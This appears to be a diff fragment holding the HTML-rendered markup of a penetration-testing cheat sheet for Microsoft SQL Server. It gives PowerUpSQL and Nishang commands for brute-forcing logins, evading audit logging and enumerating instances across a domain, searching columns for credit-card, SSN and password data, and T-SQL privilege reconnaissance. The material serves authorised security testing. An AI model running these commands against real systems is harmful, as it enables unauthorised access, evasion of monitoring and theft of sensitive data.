+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-SQLAuditWeakLoginPw&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1\Instance1&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-SQLAuditWeakLoginPw&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1\Instance1&amp;#34;&lt;/span> &lt;span class="n">-UserFile&lt;/span> &lt;span class="s2">&amp;#34;C:\dict\users.txt&amp;#34;&lt;/span> &lt;span class="n">-PassFile&lt;/span> &lt;span class="s2">&amp;#34;C:\dict\passwords.txt&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Nishang&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$comps&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nb">Get-SQLInstanceDomain&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="py">ComputerName&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$comps&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Invoke-BruteForce&lt;/span> &lt;span class="n">-UserList&lt;/span> &lt;span class="s2">&amp;#34;C:\dict\users.txt&amp;#34;&lt;/span> &lt;span class="n">-PasswordList&lt;/span> &lt;span class="s2">&amp;#34;C:\dict\passwords.txt&amp;#34;&lt;/span> &lt;span class="n">-Service&lt;/span> &lt;span class="n">SQL&lt;/span> &lt;span class="n">-Verbose&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The &amp;ldquo;sa&amp;rdquo; user is always present, but it is disabled by default (if enabled it can always be brute-forced).&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="defense-evasion">Defense Evasion&lt;/h3>
+&lt;p>In order to evade defense it is suggested to use techniques that aren’t being audited:&lt;/p>
+&lt;ol>
+&lt;li>
+&lt;p>Get audit server specifications from target SQL Servers:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLAuditServerSpec&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>Get audit database specifications from target SQL Servers:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLAuditDatabaseSpec&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;/ol>
+&lt;h3 id="information-gathering">Information Gathering&lt;/h3>
+&lt;p>Get information (SQL/OS versions, service accounts, &amp;hellip;) from a single server and check if the current user has sysadmin privs:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLServerInfo&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1\Instance1&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Get information from domain servers and check if the current user has sysadmin privs:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLInstanceDomain&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Get-SQLServerInfo&lt;/span> &lt;span class="n">-Verbose&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLInstanceDomain&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Get-SQLServerInfoThreaded&lt;/span> &lt;span class="n">-Threads&lt;/span> &lt;span class="mf">10&lt;/span> &lt;span class="n">-Verbose&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Get list of non-default databases:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLInstanceDomain&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Get-SQLDatabaseThreaded&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-Threads&lt;/span> &lt;span class="mf">10&lt;/span> &lt;span class="n">-NoDefaults&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Get an inventory of common objects from the remote server including permissions, databases, tables, views etc, and dump them out into CSV files:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-SQLDumpInfo&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1\Instance1&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Find sensitive data based on column name:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLInstanceDomain&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Get-SQLColumnSampleDataThreaded&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-Threads&lt;/span> &lt;span class="mf">10&lt;/span> &lt;span class="n">-Keyword&lt;/span> &lt;span class="s2">&amp;#34;credit,ssn,password&amp;#34;&lt;/span> &lt;span class="n">-SampleSize&lt;/span> &lt;span class="mf">2&lt;/span> &lt;span class="n">-ValidateCC&lt;/span> &lt;span class="n">-NoDefaults&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Find sensitive data based on column name, but only target databases with transparent encryption:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLInstanceDomain&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Get-SQLDatabaseThreaded&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-Threads&lt;/span> &lt;span class="mf">10&lt;/span> &lt;span class="n">-NoDefaults&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Where-Object&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">is_encrypted&lt;/span> &lt;span class="o">-eq&lt;/span> &lt;span class="s2">&amp;#34;TRUE&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Get-SQLColumnSampleDataThreaded&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-Threads&lt;/span> &lt;span class="mf">10&lt;/span> &lt;span class="n">-Keyword&lt;/span> &lt;span class="s2">&amp;#34;card, password&amp;#34;&lt;/span> &lt;span class="n">-SampleSize&lt;/span> &lt;span class="mf">2&lt;/span> &lt;span class="n">-ValidateCC&lt;/span> &lt;span class="n">-NoDefaults&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>After getting access to a SQL Server, interesting information can be gathered. These queries can be executed with &lt;code>HeidiSQL&lt;/code>:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">-- Version
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">@@&lt;/span>&lt;span class="k">version&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">-- Current User
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">SUSER_SNAME&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">SYSTEM_USER&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">-- Check sa privileges
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">IS_SRVROLEMEMBER&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;sysadmin&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">-- Current Role
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">user&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">-- Current database
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">db_name&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">-- All logins on server (gives more results if executed with sa privs)
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">FROM&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">sys&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">server_principals&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">WHERE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">type_desc&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">!=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;SERVER_ROLE&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">-- All database users for a database
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="n">USE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="k">database&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">FROM&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">sys&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">database_principals&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">WHERE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">type_desc&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">!=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;DATABASE_ROLE&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">-- List all sysadmin (gives more results if executed with sa privs)
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">type_desc&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">is_disabled&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">FROM&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">sys&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">server_principals&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">WHERE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">IS_SRVROLEMEMBER&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;sysadmin&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">-- List all database roles (gives more results if executed with sa privs)
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="n">USE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="k">database&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">DP1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">AS&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">DatabaseRoleName&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">isnull&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">DP2&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;No members&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">AS&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">DatabaseUserName&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">FROM&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">sys&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">database_role_members&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">AS&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">DRM&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">RIGHT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">OUTER&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">JOIN&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">sys&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">database_principals&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">AS&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">DP1&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">ON&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">DRM&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">role_principal_id&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">DP1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">principal_id&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">LEFT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">OUTER&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">JOIN&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">sys&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">database_principals&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">AS&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">DP2&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">ON&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">DRM&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">member_principal_id&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">DP2&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">principal_id&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">WHERE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">DP1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="k">type&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;R&amp;#39;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">ORDER&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">BY&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">DP1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">-- Effective Permissions for the server (more permissions if executed with sa privs)
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">FROM&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">fn_my_permissions&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">NULL&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;SERVER&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">-- Effective Permissions for the database (more permissions if executed with sa privs)
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="n">USE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="k">database&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">FROM&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">fn_my_permissions&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">NULL&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;DATABASE&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">-- Active user token (gives more results if executed with sa privs)
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">FROM&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">sys&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">user_token&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">-- Active login token (gives more results if executed with sa privs)
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">FROM&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">sys&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">login_token&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">-- List all databases
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">FROM&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">master&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">sys&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">databases&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">-- List all tables in a database
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">FROM&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Database01&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">information_schema&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">tables&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">-- Get row count and content of a table in a database
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">COUNT&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">FROM&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Database01&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">dbo&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">Table01&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">FROM&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Database01&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">dbo&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">Table01&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>or by &lt;code>Get-SQLQuery&lt;/code>:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLQuery&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1\Instance1&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-Query&lt;/span> &lt;span class="s2">&amp;#34;SELECT @@version&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="privilege-escalation">Privilege Escalation&lt;/h2>
+&lt;p>&lt;strong>Summary of Points&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>OS Commands can be executed if you have a sysadmin login or have been provided explicit permissions to sensitive functionality&lt;/li>
+&lt;li>Most command execution options in SQL Server run as the SQL Server service account&lt;/li>
+&lt;li>SQL Server service account can be configured as:
+&lt;ul>
+&lt;li>Local User&lt;/li>
+&lt;li>Domain User&lt;/li>
+&lt;li>Domain Admin&lt;/li>
+&lt;li>etc&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>SQL Server service account = Sysadmin (and implicitly the SQL Server service process)&lt;/li>
+&lt;/ul>
+&lt;p>A generic audit for MSSQL issues can be done via:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-SQLAudit&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1\Instance1&amp;#34;&lt;/span>
